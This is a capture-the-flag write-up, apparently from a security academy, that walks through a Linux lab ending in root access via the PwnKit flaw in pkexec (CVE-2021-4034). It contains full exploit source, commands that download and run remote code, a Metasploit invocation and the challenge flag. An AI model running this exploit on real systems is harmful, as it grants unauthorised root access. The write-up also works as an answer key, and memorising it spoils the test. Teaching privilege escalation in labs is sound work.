# The Farewell Gift - Writeup

```
  ╔═══════════════════════════════════════════════════════════════╗
  ║                     SOLUTION WALKTHROUGH                       ║
  ║              Exploit3rs Cyber Security Academy                 ║
  ╚═══════════════════════════════════════════════════════════════╝
```

**Flag**: `EXPLOIT3RS{k3v1n_g0t_r00t_sk1ll_1ssu3_l0l}`

---

## Overview

This challenge teaches:
1. Linux filesystem navigation
2. Finding hidden files and directories
3. CVE research
4. Privilege escalation via CVE-2021-4034 (PwnKit)

---

## Step-by-Step Solution

### Step 1: Initial Reconnaissance

After connecting to the terminal, start by reading the README:

```bash
kevin-debug@nimbus:~$ cat README.txt
```

This reveals three locations to investigate:
- `/opt`
- `/var/backups`
- `/tmp` (look closer)

### Step 2: Check Basic Information

```bash
kevin-debug@nimbus:~$ whoami
kevin-debug

kevin-debug@nimbus:~$ id
uid=1000(kevin-debug) gid=1000(kevin-debug) groups=1000(kevin-debug)

kevin-debug@nimbus:~$ cat /etc/passwd | grep kevin
kevin-debug:x:1000:1000::/home/kevin-debug:/bin/bash
```

We're a low-privileged user with no sudo access.

### Step 3: Explore /opt

```bash
kevin-debug@nimbus:~$ ls -la /opt/
total 12
drwxr-xr-x 1 root root 4096 Jan 15 23:47 .
drwxr-xr-x 1 root root 4096 Jan 15 23:47 ..
drwxr-xr-x 1 root root 4096 Jan 15 23:47 nimbus

kevin-debug@nimbus:~$ ls -la /opt/nimbus/
total 16
drwxr-xr-x 1 root root 4096 Jan 15 23:47 .
drwxr-xr-x 1 root root 4096 Jan 15 23:47 ..
-rw-r--r-- 1 root root  145 Jan 15 23:47 .kevin_was_here
drwxr-xr-x 1 root root 4096 Jan 15 23:47 logs

kevin-debug@nimbus:~$ cat /opt/nimbus/.kevin_was_here
# (ASCII art saying "You found me!")
# Hint: check the logs
```

**Key insight**: There's a hidden file `.kevin_was_here` (requires `ls -la`).

```bash
kevin-debug@nimbus:~$ cat /opt/nimbus/logs/debug.log
[2024-01-15 10:45:33] [WARN]  pkexec acting weird lately
[2024-01-15 10:45:34] [TODO]  update polkit when we get time
[2024-01-15 11:00:00] [KEVIN] lol they'll never update it
```

**Key insight**: pkexec and polkit are mentioned - this hints at CVE-2021-4034.

### Step 4: Explore /var/backups

```bash
kevin-debug@nimbus:~$ ls -la /var/backups/kevin_stuff/
total 16
drwxr-xr-x 1 root root 4096 Jan 15 23:47 .
drwxr-xr-x 1 root root 4096 Jan 15 23:47 ..
-rw-r--r-- 1 root root  850 Jan 15 23:47 .secret_note.txt
drwxr-xr-x 1 root root 4096 Jan 15 23:47 memes

kevin-debug@nimbus:~$ cat /var/backups/kevin_stuff/memes/skill_issue.txt
# (Red herring - "SKILL ISSUE" message)

kevin-debug@nimbus:~$ cat /var/backups/kevin_stuff/.secret_note.txt
```

The secret note reveals:
- The flag is in `/root/kevin_farewell/`
- We need root access
- Hints about: pkexec, kit, 2021

### Step 5: Explore /tmp

```bash
kevin-debug@nimbus:~$ ls -la /tmp/
total 12
drwxrwxrwt 1 root root 4096 Jan 15 23:47 .
drwxr-xr-x 1 root root 4096 Jan 15 23:47 ..
drwxr-xr-x 1 root root 4096 Jan 15 23:47 .k3v1n

kevin-debug@nimbus:~$ cat /tmp/.k3v1n/hints.txt
```

The final hint reveals:
- CVE-2021-XXXX
- "pwn... something... kit..."

### Step 6: Research the CVE

The clues point to:
- pkexec
- polkit
- CVE-2021
- "pwnkit"

Googling "CVE-2021 pwnkit pkexec" reveals **CVE-2021-4034**.

### Step 7: Verify Vulnerability

```bash
kevin-debug@nimbus:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 Jan 15 23:47 /usr/bin/pkexec

kevin-debug@nimbus:~$ pkexec --version
pkexec version 0.105
```

The binary has SUID bit set (`s` in permissions) and the version is vulnerable (< 0.120).

### Step 8: Exploit PwnKit

There are several public exploits available. Here's a simple approach:

**Method A: Using a pre-compiled exploit**

```bash
# Download exploit
kevin-debug@nimbus:~$ cd /tmp
kevin-debug@nimbus:/tmp$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
kevin-debug@nimbus:/tmp$ chmod +x PwnKit
kevin-debug@nimbus:/tmp$ ./PwnKit
# whoami
root
```

**Method B: Compile from source**

```bash
kevin-debug@nimbus:~$ cd /tmp

# Create exploit
kevin-debug@nimbus:/tmp$ cat > exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
EOF

kevin-debug@nimbus:/tmp$ cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    char *env[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };

    mkdir("GCONV_PATH=.", 0755);

    FILE *f = fopen("GCONV_PATH=./pwnkit", "w");
    fprintf(f, "module  PWNKIT//    INTERNAL    ../exploit    2\n");
    fclose(f);

    system("gcc -shared -fPIC -o exploit.so exploit.c");

    char *args[] = {NULL};
    execve("/usr/bin/pkexec", args, env);

    return 0;
}
EOF

kevin-debug@nimbus:/tmp$ gcc exploit.c -shared -fPIC -o exploit.so
kevin-debug@nimbus:/tmp$ gcc pwnkit.c -o pwnkit
kevin-debug@nimbus:/tmp$ ./pwnkit
```

**Method C: One-liner using existing tools**

```bash
kevin-debug@nimbus:~$ curl -fsSL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034-poc.c -o poc.c && gcc poc.c -o poc && ./poc
```

### Step 9: Capture the Flag

Once you have root:

```bash
# whoami
root

# cat /root/kevin_farewell/flag.txt

    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   EXPLOIT3RS{k3v1n_g0t_r00t_sk1ll_1ssu3_l0l}                   ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
```

Also check the goodbye message:

```bash
# cat /root/kevin_farewell/goodbye.txt
```

---

## Alternative Solutions

### Using Metasploit

```bash
msfconsole
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <session_id>
set LHOST <your_ip>
run
```

### Using LinPEAS

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Will identify CVE-2021-4034 as a privilege escalation vector
```

---

## Key Takeaways

1. **Always use `ls -la`** - Hidden files start with `.` and won't show with regular `ls`
2. **Read everything** - Log files, notes, and history often contain hints
3. **Research CVEs** - Once you identify a vulnerable service, look up public exploits
4. **Check SUID binaries** - `find / -perm -4000 2>/dev/null` lists SUID binaries
5. **Version matters** - Always check service versions against known CVEs

---

## References

- [CVE-2021-4034 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
- [Qualys Security Advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
- [PwnKit GitHub](https://github.com/ly4k/PwnKit)
- [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)

---

```
"skill issue" - Kevin, probably
```
